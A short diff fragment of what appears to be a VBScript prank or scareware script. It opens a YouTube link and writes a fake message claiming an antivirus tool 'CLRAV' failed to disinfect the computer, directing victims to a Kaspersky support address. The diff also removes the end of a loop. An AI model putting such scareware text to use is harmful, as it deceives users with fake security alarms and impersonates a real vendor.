@@ -3323,8 +3323,3 @@ carew.Run "https://www.youtube.com/watch?v=xvFZjo5PgG0"
 virus.Writeline "Due an error, Code error:3212552, CLRAV has not disinfect your computer"                                 
 virus.Writeline "For Support please send a e-mail to support@kaspersky.com and please indicate the Code Error." 			
 virus.Close	
-
-	
-    i = i + 1
-    WScript.Sleep 100  ' Slight delay to prevent system freeze
-Loop
